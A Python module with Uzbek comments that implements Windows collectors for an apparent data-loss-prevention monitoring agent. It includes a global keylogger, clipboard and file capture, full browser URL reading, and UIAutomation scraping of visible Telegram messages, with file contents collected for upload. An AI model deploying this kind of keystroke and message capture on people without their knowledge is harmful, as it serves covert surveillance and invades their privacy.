"""Windows'ga xos kolektorlar. Faqat Windows'da import qilinadi.

Bosqich 1: faol oyna (+ davomiylik), klaviatura, USB disk, printer, o'rnatilgan dastur.
Keyingi bosqichlarda: clipboard, fayl monitoringi, veb, e-mail, telegram va h.k.
"""
import logging
import string
import threading
import time

from .base import Collector, FileProvider, now_iso

log = logging.getLogger("agent.windows")


def _foreground():
    """Joriy faol oyna uchun (app_nomi, sarlavha) qaytaradi."""
    try:
        import win32gui
        import win32process
        import psutil
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        app = ""
        try:
            app = psutil.Process(pid).name()
        except Exception:  # noqa: BLE001
            pass
        return app, title
    except Exception as e:  # noqa: BLE001
        log.debug("foreground o'qilmadi: %s", e)
        return "", ""


# Fayl tanlash/yuklash oynasi sarlavhasidagi kalit so'zlar (rus/ingliz/o'zbek)
_DIALOG_KEYWORDS = (
    "открыт", "выбер", "загруз", "выгруз", "отправ",
    "open", "upload", "attach", "choose file", "select file", "file upload",
    "ochish", "tanla", "yuklash", "yubor",
)


def file_dialog_title() -> str | None:
    """Agar faol oyna 'fayl tanlash/yuklash' muloqot oynasi bo'lsa, uning sarlavhasini qaytaradi.

    Brauzer/Telegram/pochta orqali fayl biriktirganда ochiladigan oynани aniqlaydi —
    o'sha paytда skrinshot olsak, qaysi fayl tanlanayotgani ko'rinadi.
    """
    try:
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd) or ""
        low = title.lower()
        if any(k in low for k in _DIALOG_KEYWORDS):
            return title
        return None
    except Exception:  # noqa: BLE001
        return None


class WindowsActiveWindow(Collector):
    """Faol oyna almashganda, tark etilgan oynada sarflangan vaqtni qaytaradi."""
    name = "active_window"

    def __init__(self):
        self._cur = None
        self._since = time.time()

    def poll(self) -> list[dict]:
        app, title = _foreground()
        if not title:
            return []
        key = (app, title)
        if self._cur is None:
            self._cur, self._since = key, time.time()
            return []
        if key == self._cur:
            return []
        prev_app, prev_title = self._cur
        duration = int(time.time() - self._since)
        self._cur, self._since = key, time.time()
        return [{
            "type": "active_window", "severity": "info",
            "app": prev_app, "title": prev_title,
            "occurred_at": now_iso(),
            "details": {"duration_sec": duration},
        }]


class WindowsKeyboard(Collector):
    """Terilgan matnni to'playdi va BUTUN GAP sifatida yuboradi.

    Matn quyidagi hollarда yuboriladi (bo'laklanmaydi):
      - Enter bosilганда (chatда xabar yuborilди),
      - yozishdан to'xtaganда (idle, ~5s),
      - oyna/chat almashganда,
      - buffer juda kattalashganда.
    Backspace hisobga olinadi; boshqaruv belgilari (Ctrl+C/V) o'tkazib yuboriladi.
    """
    name = "keyboard"

    def __init__(self, idle_sec: float = 5.0, max_chars: int = 500):
        self.idle_sec = idle_sec
        self.max_chars = max_chars
        self._buf: list[str] = []
        self._lock = threading.Lock()
        self._last_key = time.time()
        self._flush_pending = False   # Enter bosildi -> yuborish kerak
        self._ctx = None              # matn qaysi oyna/chatда yozilmoqda
        self._start_listener()

    def _start_listener(self):
        try:
            from pynput import keyboard
        except ImportError as e:
            log.error("pynput yo'q — klaviatura ishlamaydi: %s", e)
            return

        def on_press(key):
            try:
                from pynput import keyboard as kb
                with self._lock:
                    self._last_key = time.time()
                    if key == kb.Key.space:
                        self._buf.append(" ")
                    elif key == kb.Key.enter:
                        self._flush_pending = True   # xabar yuborildi -> flush
                    elif key == kb.Key.backspace:
                        if self._buf:
                            self._buf.pop()
                    elif hasattr(key, "char") and key.char is not None and key.char.isprintable():
                        self._buf.append(key.char)
            except Exception:  # noqa: BLE001
                pass

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        log.info("Klaviatura tinglovchisi ishga tushdi")

    def poll(self) -> list[dict]:
        now = time.time()
        app, title = _foreground()
        with self._lock:
            if not self._buf and not self._flush_pending:
                self._ctx = None
                return []
            if self._ctx is None:
                self._ctx = (app, title)   # matn shu oynaда boshlandi

            context_changed = (app, title) != self._ctx
            idle = (now - self._last_key) >= self.idle_sec
            big = len(self._buf) >= self.max_chars

            if not (self._flush_pending or context_changed or idle or big):
                return []

            text = "".join(self._buf).strip()
            ctx_app, ctx_title = self._ctx
            self._buf.clear()
            self._flush_pending = False
            self._ctx = None

        if not text:
            return []
        return [{
            "type": "keyboard", "severity": "info",
            "app": ctx_app, "title": ctx_title, "text": text,
            "occurred_at": now_iso(), "details": {},
        }]


class WindowsUsb(Collector):
    """Olinadigan (removable) disklarning ulanishi/uzilishini kuzatadi."""
    name = "usb"

    def __init__(self):
        self._known = self._scan()

    def _scan(self) -> dict[str, str]:
        drives: dict[str, str] = {}
        try:
            import win32file
            import win32api
            for letter in string.ascii_uppercase:
                root = f"{letter}:\\"
                try:
                    if win32file.GetDriveType(root) == win32file.DRIVE_REMOVABLE:
                        label = ""
                        try:
                            label = win32api.GetVolumeInformation(root)[0]
                        except Exception:  # noqa: BLE001
                            pass
                        drives[f"{letter}:"] = label or "USB disk"
                except Exception:  # noqa: BLE001
                    continue
        except ImportError as e:
            log.error("win32 yo'q — USB kuzatuvi ishlamaydi: %s", e)
        return drives

    def poll(self) -> list[dict]:
        current = self._scan()
        events: list[dict] = []
        for drive, label in current.items():
            if drive not in self._known:
                events.append({
                    "type": "usb", "channel": "usb", "severity": "warn",
                    "title": f"USB disk ulandi: {drive} ({label})",
                    "occurred_at": now_iso(),
                    "details": {"action": "connected", "drive": drive, "label": label},
                })
        for drive, label in self._known.items():
            if drive not in current:
                events.append({
                    "type": "usb", "channel": "usb", "severity": "info",
                    "title": f"USB disk uzildi: {drive} ({label})",
                    "occurred_at": now_iso(),
                    "details": {"action": "disconnected", "drive": drive, "label": label},
                })
        self._known = current
        return events


class WindowsPrinter(Collector):
    """Printer qo'shilishi/olib tashlanishini kuzatadi.

    Eslatma: chop etilgan hujjat mazmunini olish (spooler monitoringi) keyingi bosqichда.
    """
    name = "printer"

    def __init__(self):
        self._known = self._scan()

    def _scan(self) -> set[str]:
        try:
            import win32print
            flags = win32print.PRINTER_ENUM_LOCAL | win32print.PRINTER_ENUM_CONNECTIONS
            return {p[2] for p in win32print.EnumPrinters(flags)}
        except Exception as e:  # noqa: BLE001
            log.debug("printerlar o'qilmadi: %s", e)
            return set()

    def poll(self) -> list[dict]:
        current = self._scan()
        events: list[dict] = []
        for name in current - self._known:
            events.append({
                "type": "printer", "channel": "print", "severity": "info",
                "title": f"Printer qo'shildi: {name}",
                "occurred_at": now_iso(), "details": {"action": "added", "printer": name},
            })
        for name in self._known - current:
            events.append({
                "type": "printer", "channel": "print", "severity": "info",
                "title": f"Printer olib tashlandi: {name}",
                "occurred_at": now_iso(), "details": {"action": "removed", "printer": name},
            })
        self._known = current
        return events


class WindowsSoftware(Collector):
    """O'rnatilgan dasturlar ro'yxatini registrdan o'qiydi va o'zgarishni (o'rnatish/o'chirish) qaytaradi.

    Birinchi ishga tushishda bazaviy ro'yxat eslab qolinadi, hodisa yuborilmaydi.
    Keyin faqat farqlar yuboriladi.
    """
    name = "software"

    def __init__(self, interval_sec: int = 300):
        self.interval_sec = interval_sec
        self._last_check = 0.0
        self._known = self._scan()  # bazaviy ro'yxat

    def _scan(self) -> dict[str, str]:
        apps: dict[str, str] = {}
        try:
            import winreg
        except ImportError:
            return apps
        roots = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        for hive, path in roots:
            try:
                key = winreg.OpenKey(hive, path)
            except OSError:
                continue
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    sub = winreg.OpenKey(key, winreg.EnumKey(key, i))
                    name = winreg.QueryValueEx(sub, "DisplayName")[0]
                    try:
                        ver = winreg.QueryValueEx(sub, "DisplayVersion")[0]
                    except OSError:
                        ver = ""
                    apps[name] = ver
                except OSError:
                    continue
        return apps

    def poll(self) -> list[dict]:
        now = time.time()
        if now - self._last_check < self.interval_sec:
            return []
        self._last_check = now
        current = self._scan()
        events: list[dict] = []
        for name, ver in current.items():
            if name not in self._known:
                events.append({
                    "type": "software", "severity": "warn",
                    "title": f"Yangi dastur o'rnatildi: {name} {ver}".strip(),
                    "occurred_at": now_iso(),
                    "details": {"action": "installed", "name": name, "version": ver},
                })
        for name in self._known:
            if name not in current:
                events.append({
                    "type": "software", "severity": "info",
                    "title": f"Dastur o'chirildi: {name}",
                    "occurred_at": now_iso(),
                    "details": {"action": "removed", "name": name},
                })
        self._known = current
        return events


class WindowsClipboard(Collector):
    """Clipboard (nusxa olingan matn) o'zgarishini kuzatadi."""
    name = "clipboard"

    def __init__(self):
        self._last = ""

    def poll(self) -> list[dict]:
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            try:
                data = ""
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT) or ""
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:  # noqa: BLE001
            log.debug("clipboard o'qilmadi: %s", e)
            return []

        data = (data or "").strip()
        if not data or data == self._last:
            return []
        self._last = data
        app, _ = _foreground()
        return [{
            "type": "clipboard", "channel": "clipboard", "severity": "info",
            "app": app, "text": data[:2000],
            "occurred_at": now_iso(), "details": {},
        }]


class WindowsFileMonitor(Collector):
    """Foydalanuvchi papkalarida (Desktop, Documents, Downloads) fayl o'zgarishini kuzatadi.

    Dedup: bir fayl+harakat qisqa vaqtда (30s) bir marta yoziladi — yuklab olishда
    takrorlanadigan "o'zgartirildi" signallari birlashtiriladi.
    """
    name = "file_monitor"
    DEDUP_SEC = 30

    def __init__(self):
        self._buf: list[dict] = []
        self._last: dict = {}
        self._lock = threading.Lock()
        self._start()

    def _start(self):
        try:
            import os
            from watchdog.observers import Observer
            from watchdog.events import FileSystemEventHandler
        except ImportError as e:
            log.error("watchdog yo'q — fayl monitoringi ishlamaydi: %s", e)
            return

        buf, lock, last = self._buf, self._lock, self._last
        dedup = self.DEDUP_SEC

        class Handler(FileSystemEventHandler):
            def _add(self, action, path, uz, sev="info"):
                key = (path, action)
                now = time.time()
                with lock:
                    if last.get(key) and now - last[key] < dedup:
                        return  # yaqinda yozilган — takrorlamaymiz
                    last[key] = now
                    buf.append({
                        "type": "file_monitor", "channel": "file", "severity": sev,
                        "title": f"Fayl {uz}: {os.path.basename(path)}",
                        "occurred_at": now_iso(),
                        "details": {"action": action, "path": path},
                    })

            def on_created(self, e):
                if not e.is_directory:
                    self._add("created", e.src_path, "yaratildi")

            def on_modified(self, e):
                if not e.is_directory:
                    self._add("modified", e.src_path, "o'zgartirildi")

            def on_deleted(self, e):
                if not e.is_directory:
                    self._add("deleted", e.src_path, "o'chirildi", "warn")

            def on_moved(self, e):
                if not e.is_directory:
                    self._add("moved", e.dest_path, "ko'chirildi", "warn")

        home = os.path.expanduser("~")
        observer = Observer()
        for sub in ("Desktop", "Documents", "Downloads"):
            path = os.path.join(home, sub)
            if os.path.isdir(path):
                observer.schedule(Handler(), path, recursive=True)
        observer.daemon = True
        observer.start()
        log.info("Fayl monitoringi ishga tushdi (Desktop, Documents, Downloads)")

    def poll(self) -> list[dict]:
        with self._lock:
            if not self._buf:
                return []
            out = self._buf[:]
            self._buf.clear()
        return out


_BROWSERS = {"chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe"}


import re as _re

# Brauzer nomi (sarlavha oxirida) — ruscha/inglizcha "profil", "yana N sahifa" bilan
_BROWSER_TAIL = _re.compile(
    r"\s*[—\-]\s*(?:Профиль\s*\d+\s*[:：]\s*)?"
    r"(Google\s*Chrome|Microsoft\s*Edge|Mozilla\s*Firefox|Opera|Brave)\s*$",
    _re.IGNORECASE,
)
# "... и еще N страниц(ы)" / "... and N more pages"
_MORE_PAGES = _re.compile(r"\s*(?:и еще|and)\s*\d+\s*(?:more pages?|страниц[аы]?|страниц)\s*$", _re.IGNORECASE)
# oxiridagi " - Поиск" / " - Search"
_SEARCH_TAIL = _re.compile(r"\s*[—\-]\s*(Поиск|Search)\s*$", _re.IGNORECASE)


def _clean_site(title: str) -> str:
    """Brauzer sarlavhasidan ortiqcha qismlarni olib tashlaydi.

    Masalan: 'masofaviyaudit.uz - Поиск и еще 3 страницы — Профиль 1: Microsoft Edge'
          -> 'masofaviyaudit.uz'
    """
    t = _re.sub(r"[‎‏‪-‮]", "", title or "").strip()
    prev = None
    # Takroriy qo'llash: dumlar ketma-ket bo'lishi mumkin
    while prev != t:
        prev = t
        t = _BROWSER_TAIL.sub("", t).strip()
        t = _MORE_PAGES.sub("", t).strip()
        t = _SEARCH_TAIL.sub("", t).strip()
    return t or (title or "").strip()


def _browser_url() -> str:
    """Faol brauzer oynasining manzil satridan TO'LIQ URLни o'qiydi (UIAutomation).

    Chrome/Edge/Firefox'да manzil satri — ValuePattern'ли Edit control. uiautomation
    kutubxonasi yo'q yoki o'qib bo'lmasa — bo'sh satr (sarlavha baribir yoziladi).
    Faqat tab almashganда chaqiriladi (tez-tez emas), shuning uchun sekinlik sezilmaydi.
    """
    try:
        import uiautomation as auto
    except ImportError:
        return ""
    try:
        import win32gui
        hwnd = win32gui.GetForegroundWindow()
        if not hwnd:
            return ""
        win = auto.ControlFromHandle(hwnd)
        if not win:
            return ""
        edit = win.EditControl(searchDepth=6)    # manzil satri (sayoz qidiruv — tez)
        if not edit.Exists(0.12, 0.03):
            return ""
        try:
            val = (edit.GetValuePattern().Value or "").strip()
        except Exception:  # noqa: BLE001
            return ""
        # Qidiruv matni (bo'sh yoki nuqtasiz bo'shliqли) — URL emas
        if not val or (" " in val and "." not in val):
            return ""
        # Chrome manzil satri sxemани yashirishi mumkin — to'ldiramiz
        schemes = ("http://", "https://", "ftp://", "file://", "about:", "chrome:", "edge:")
        if not val.startswith(schemes) and "." in val.split("/")[0]:
            val = "https://" + val
        return val[:1000]
    except Exception as e:  # noqa: BLE001
        log.debug("URL o'qilmadi: %s", e)
        return ""


class WindowsWeb(Collector):
    """Brauzer faol oynasidan tashrif, TO'LIQ URL va unда o'tkazilgan vaqtни qayd etadi.

    Sahifa almashganда oldingi sahifада turган vaqt (duration_sec) va o'sha sahifaning
    to'liq URL'i (UIAutomation orqali manzil satriдан) yuboriladi.
    """
    name = "web"

    def __init__(self):
        self._cur = None       # (app, clean_title)
        self._cur_url = ""     # joriy tab URL'i (tab almashganда o'qiladi)
        self._since = time.time()

    def poll(self) -> list[dict]:
        app, title = _foreground()
        is_browser = app.lower() in _BROWSERS and bool(title)
        key = (app, _clean_site(title)) if is_browser else None

        if key == self._cur:
            return []

        out = []
        if self._cur is not None:
            prev_app, prev_site = self._cur
            duration = int(time.time() - self._since)
            if duration >= 2:  # juda qisqa ko'rinishlarni o'tkazib yuborish
                details = {"duration_sec": duration}
                if self._cur_url:
                    details["url"] = self._cur_url
                out.append({
                    "type": "web", "channel": "web", "severity": "info",
                    "app": prev_app, "title": prev_site,
                    "occurred_at": now_iso(), "details": details,
                })
        self._cur = key
        self._cur_url = _browser_url() if key is not None else ""   # yangi tab URL'i
        self._since = time.time()
        return out


# Telegram matnidан tashlab yuboriladigan shovqin (vaqt, umumiy tugma/holat so'zlari)
_TG_TIME = _re.compile(r"^\d{1,2}:\d{2}(\s*(AM|PM))?$", _re.IGNORECASE)
_TG_NOISE = {
    "saved messages", "online", "typing", "typing…", "typing...", "edited",
    "chat", "search", "settings", "forwarded message", "reply", "forward",
    "last seen recently", "bot", "channel", "group",
}


def _telegram_texts(hwnd, limit: int = 60) -> list[str]:
    """Telegram Desktop oynasиdан ko'rinayotган matnlarни (xabarlarни) yig'adi — UIAutomation.

    Telegram Qt'да chizilgani uchun BU BEST-EFFORT: ba'zi versiyalarда matn to'liq
    o'qiladi, ba'zilarида cheklangan. O'qib bo'lmasa — bo'sh ro'yxat (xato bermaydi).
    Daraxt kesib o'tish chegaralangan (tugun va chuqurlik bo'yicha) — sekinlashtirmaslik uchun.
    """
    try:
        import uiautomation as auto
    except ImportError:
        return []
    try:
        root = auto.ControlFromHandle(hwnd)
    except Exception:  # noqa: BLE001
        return []
    if not root:
        return []
    out: list[str] = []
    stack = [(root, 0)]
    visited = 0
    while stack and visited < 800:
        ctrl, depth = stack.pop()
        visited += 1
        try:
            name = (ctrl.Name or "").strip()
        except Exception:  # noqa: BLE001
            name = ""
        # Xabarга o'xshash matn: kamida 4 belgi va (bo'shliqли yoki uzun)
        if name and len(name) >= 4 and (" " in name or len(name) >= 10):
            low = name.lower()
            if low not in _TG_NOISE and not _TG_TIME.match(name):
                out.append(name[:2000])
                if len(out) >= limit:
                    break
        if depth < 30:
            try:
                for ch in ctrl.GetChildren():
                    stack.append((ch, depth + 1))
            except Exception:  # noqa: BLE001
                pass
    return out


class WindowsTelegram(Collector):
    """Telegram Desktop oynasидаги ko'rinган yozishmани (xabarlarни) o'qiydi — UIAutomation.

    MUHIM: Telegram boshqalarning xabarlarini o'qish uchun API BERMAYDI va Qt'да
    chizilgani uchun bu BEST-EFFORT — haqiqiy Telegram Desktop'да sinab sozlash kerak.
    Chiquvchi (yozilган) matn allaqachon klaviatura kollektorида bor; bu kollektor
    asosan KIRUVCHI va ko'rinган yozishmани qo'shadi. Matn DLP skaniдан o'tadi —
    maxfiy so'z/karta/pasport topilса backend avtomatik "Yuqori" darajага ko'taradi.

    Shovqinни kamaytirish: faqat Telegram faol oynада bo'lганда, har ~6s, dedup bilан.
    """
    name = "telegram"
    SCAN_SEC = 10
    MAX_SEEN = 800

    def __init__(self):
        import collections
        self._out = collections.deque(maxlen=500)   # tayyor hodisalar (poll shuni oladi)
        self._lock = threading.Lock()
        self._seen = collections.deque()            # dedup tartibi
        self._seen_set: set[str] = set()
        self._start()

    def _start(self):
        """UI daraxtни kesib o'tish — ALOHIDA OQIMДА (asosiy siklни bloklamaydi)."""
        t = threading.Thread(target=self._loop, daemon=True)
        t.start()

    def _loop(self):
        while True:
            try:
                app, title = _foreground()
                if "telegram" in app.lower():
                    import win32gui
                    hwnd = win32gui.GetForegroundWindow()
                    chat = _re.sub(r"\s*[—\-]\s*Telegram\s*$", "", title or "").strip() or None
                    for msg in _telegram_texts(hwnd):
                        if msg in self._seen_set:
                            continue
                        self._seen.append(msg)
                        self._seen_set.add(msg)
                        if len(self._seen) > self.MAX_SEEN:
                            old = self._seen.popleft()
                            self._seen_set.discard(old)
                        with self._lock:
                            self._out.append({
                                "type": "telegram", "channel": "telegram", "severity": "info",
                                "app": app, "title": chat, "text": msg,
                                "occurred_at": now_iso(), "details": {"chat": chat, "source": "uia"},
                            })
            except Exception as e:  # noqa: BLE001
                log.debug("telegram skan xato: %s", e)
            time.sleep(self.SCAN_SEC)

    def poll(self) -> list[dict]:
        with self._lock:
            if not self._out:
                return []
            out = list(self._out)
            self._out.clear()
        return out


class WindowsFiles(FileProvider):
    """Diskka tushgan (qabul qilingan/yuklab olingan) va USB'ga ko'chirilган fayllarni
    ushlab, serverga yuboradi (DLP tekshiruvi uchun).

    Kuzatiladi: foydalanuvchi papkalari (Downloads, Desktop, Documents, Pictures, Videos)
    va ULANGAN BARCHA USB disklar (yangi ulanganlari ham avtomatik qo'shiladi).

    Shunday qilib: brauzer/Telegram/pochta orqali YUKLAB OLINGAN fayllar va
    USB'ga KO'CHIRILGAN (chiqarilган) fayllar ushlanadi.
    """
    name = "files"
    MAX_SIZE = 20 * 1024 * 1024  # 20 MB
    SKIP_EXT = {".tmp", ".crdownload", ".part", ".lnk", ".ini", ".db", ".log", ".dll", ".sys"}

    def __init__(self):
        import collections
        self._queue = collections.deque(maxlen=1000)
        self._seen: dict[str, tuple] = {}
        self._lock = threading.Lock()
        self._observer = None
        self._watched_drives: set[str] = set()
        self._start()

    def _handler(self):
        from watchdog.events import FileSystemEventHandler
        import os
        queue, lock = self._queue, self._lock

        class Handler(FileSystemEventHandler):
            def _enq(self, path):
                if not path:
                    return
                if os.path.splitext(path)[1].lower() in WindowsFiles.SKIP_EXT:
                    return
                # DLP agentining o'z fayllarini (exe/msi/.new/.old) o'tkazib yuborish
                if "hp-dlp-agent" in os.path.basename(path).lower():
                    return
                with lock:
                    queue.append(path)

            def on_created(self, e):
                if not e.is_directory:
                    self._enq(e.src_path)

            def on_modified(self, e):
                if not e.is_directory:
                    self._enq(e.src_path)

            def on_moved(self, e):
                if not e.is_directory:
                    self._enq(getattr(e, "dest_path", None))

        return Handler()

    def _start(self):
        try:
            import os
            from watchdog.observers import Observer
        except ImportError as e:
            log.error("watchdog yo'q — fayl ushlash ishlamaydi: %s", e)
            return

        self._observer = Observer()
        home = os.path.expanduser("~")
        for sub in ("Downloads", "Desktop", "Documents", "Pictures", "Videos"):
            path = os.path.join(home, sub)
            if os.path.isdir(path):
                try:
                    self._observer.schedule(self._handler(), path, recursive=True)
                except Exception:  # noqa: BLE001
                    pass
        self._observer.daemon = True
        self._observer.start()
        log.info("Fayl ushlash ishga tushdi (papkalar + USB kuzatuvi)")

        # USB disklarni dinamik kuzatish (yangi ulanganini ham)
        t = threading.Thread(target=self._watch_usb_loop, daemon=True)
        t.start()

    def _removable_drives(self) -> list[str]:
        drives = []
        try:
            import win32file
            import string
            for letter in string.ascii_uppercase:
                root = f"{letter}:\\"
                try:
                    if win32file.GetDriveType(root) == win32file.DRIVE_REMOVABLE and __import__("os").path.exists(root):
                        drives.append(root)
                except Exception:  # noqa: BLE001
                    continue
        except ImportError:
            pass
        return drives

    def _watch_usb_loop(self):
        import time as _t
        while True:
            try:
                for root in self._removable_drives():
                    if root not in self._watched_drives and self._observer is not None:
                        try:
                            self._observer.schedule(self._handler(), root, recursive=True)
                            self._watched_drives.add(root)
                            log.info("USB disk kuzatuvga olindi: %s", root)
                        except Exception:  # noqa: BLE001
                            pass
            except Exception:  # noqa: BLE001
                pass
            _t.sleep(8)

    def _channel_for(self, path: str) -> str:
        """Fayl USB diskdami yoki oddiy papkadami."""
        try:
            import win32file
            root = path[:3]  # "E:\\"
            if win32file.GetDriveType(root) == win32file.DRIVE_REMOVABLE:
                return "usb"
        except Exception:  # noqa: BLE001
            pass
        return "file"

    def _zone_url(self, path: str) -> str:
        """Brauzer yuklaган faylда Windows manba URL'ini saqlaydi (NTFS Zone.Identifier)."""
        try:
            host, ref = "", ""
            with open(path + ":Zone.Identifier", "r", encoding="utf-8", errors="ignore") as z:
                for line in z:
                    low = line.strip().lower()
                    if low.startswith("hosturl="):
                        host = line.strip().split("=", 1)[1]
                    elif low.startswith("referrerurl="):
                        ref = line.strip().split("=", 1)[1]
            return host or ref
        except OSError:
            return ""

    def capture(self):
        import os
        import mimetypes
        while True:
            with self._lock:
                if not self._queue:
                    return None
                path = self._queue.popleft()
            try:
                if not os.path.isfile(path):
                    continue
                st = os.stat(path)
                if st.st_size == 0 or st.st_size > self.MAX_SIZE:
                    continue
                sig = (st.st_size, int(st.st_mtime))
                if self._seen.get(path) == sig:
                    continue  # shu fayl shu holatда allaqachon yuborilган
                with open(path, "rb") as f:
                    data = f.read()
                self._seen[path] = sig
                name = os.path.basename(path)
                mime = mimetypes.guess_type(name)[0] or "application/octet-stream"
                ctx_app, ctx_title = _foreground()
                return {
                    "data": data, "filename": name, "mime": mime,
                    "channel": self._channel_for(path), "source_path": path,
                    "source_url": self._zone_url(path),
                    "context_app": ctx_app, "context_title": ctx_title,
                }
            except (OSError, PermissionError):
                continue  # fayl band yoki o'chirilган — keyingisi


class WindowsClipboardFiles(FileProvider):
    """Clipboard orqali NUSXALANGAN fayl (CF_HDROP) va RASM (CF_DIB) ni ushlaydi.

    Foydalanuvchi Explorer'да faylni Ctrl+C qilib, Telegram/pochta/chat oynasiga
    Ctrl+V qilsa — WindowsFiles (papka/USB kuzatuvi) buni KO'RMAYDI, chunki fayl
    diskда yangi joyда paydo bo'lmaydi. Shu provider clipboarddagi faylni/rasmни
    o'qib, DLP tekshiruvi uchun serverga yuboradi.

    Kanal = "clipboard". Kontekst = nusxa olingan paytdagi faol oyna.
    O'zgarishni arzon aniqlash uchun GetClipboardSequenceNumber ishlatiladi.
    """
    name = "clipboard_files"
    MAX_SIZE = WindowsFiles.MAX_SIZE
    SKIP_EXT = WindowsFiles.SKIP_EXT

    def __init__(self):
        import collections
        self._queue = collections.deque(maxlen=200)
        self._last_seq = -1
        self._seen: dict[str, tuple] = {}   # fayl path -> (size, mtime)
        self._last_img_hash = ""

    def _seq(self) -> int:
        """Clipboard versiya raqami — har o'zgarishда ortadi (arzon tekshiruv)."""
        try:
            import ctypes
            return int(ctypes.windll.user32.GetClipboardSequenceNumber())
        except Exception:  # noqa: BLE001
            return -1

    def _enqueue_file(self, path: str):
        import os
        import mimetypes
        if not isinstance(path, str) or not os.path.isfile(path):
            return
        if os.path.splitext(path)[1].lower() in self.SKIP_EXT:
            return
        if "hp-dlp-agent" in os.path.basename(path).lower():
            return
        try:
            st = os.stat(path)
        except OSError:
            return
        if st.st_size == 0 or st.st_size > self.MAX_SIZE:
            return
        sig = (st.st_size, int(st.st_mtime))
        if self._seen.get(path) == sig:
            return  # shu fayl shu holatда allaqachon yuborilган
        try:
            with open(path, "rb") as f:
                data = f.read()
        except (OSError, PermissionError):
            return
        self._seen[path] = sig
        name = os.path.basename(path)
        mime = mimetypes.guess_type(name)[0] or "application/octet-stream"
        ctx_app, ctx_title = _foreground()
        self._queue.append({
            "data": data, "filename": name, "mime": mime,
            "channel": "clipboard", "source_path": path, "source_url": "",
            "context_app": ctx_app, "context_title": ctx_title,
        })

    def _enqueue_image(self, img):
        import io
        import time as _t
        import hashlib
        try:
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="PNG")
            data = buf.getvalue()
        except Exception as e:  # noqa: BLE001
            log.debug("clipboard rasm saqlanmadi: %s", e)
            return
        if not data or len(data) > self.MAX_SIZE:
            return
        h = hashlib.sha256(data).hexdigest()
        if h == self._last_img_hash:
            return  # xuddi shu rasm allaqachon yuborilган
        self._last_img_hash = h
        name = _t.strftime("clipboard_%Y%m%d_%H%M%S.png")
        ctx_app, ctx_title = _foreground()
        self._queue.append({
            "data": data, "filename": name, "mime": "image/png",
            "channel": "clipboard", "source_path": "(clipboard)", "source_url": "",
            "context_app": ctx_app, "context_title": ctx_title,
        })

    def _scan(self):
        """Clipboard o'zgarган bo'lsa — fayl(lar)ni yoki rasmni navbatга qo'yadi."""
        try:
            from PIL import ImageGrab
        except ImportError:
            return
        try:
            obj = ImageGrab.grabclipboard()
        except Exception as e:  # noqa: BLE001
            log.debug("clipboard grab xato: %s", e)
            return
        if isinstance(obj, list):            # CF_HDROP — nusxalangan fayllar ro'yxati
            for path in obj:
                self._enqueue_file(path)
        elif obj is not None and hasattr(obj, "save"):  # CF_DIB — rasm (PIL Image)
            self._enqueue_image(obj)

    def capture(self):
        seq = self._seq()
        if seq != self._last_seq:
            self._last_seq = seq
            try:
                self._scan()
            except Exception as e:  # noqa: BLE001
                log.debug("clipboard_files scan xato: %s", e)
        if self._queue:
            return self._queue.popleft()
        return None
